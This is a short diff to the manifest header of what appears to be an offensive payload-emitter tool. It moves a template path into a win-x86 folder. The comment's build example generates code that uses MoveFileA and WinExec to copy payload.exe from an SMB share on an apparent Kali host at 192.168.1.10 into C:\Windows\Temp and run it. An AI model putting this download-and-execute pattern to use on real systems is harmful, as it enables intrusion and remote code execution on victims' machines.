@@ -2,7 +2,7 @@ template: ir_move_then_run
 # IR workflow: MoveFileA + WinExec with exit strategy.
 #
 # Build:
-#   uv run emitrion emitrion/manifests/ir_move_then_run.yaml \
+#   uv run emitrion emitrion/manifests/win-x86/ir_move_then_run.yaml \
 #       --src "\\\\192.168.1.10\\kalismb\\payload.exe" \
 #       --dst "C:\\Windows\\Temp\\payload.exe" \
 #       --out emitter_out/
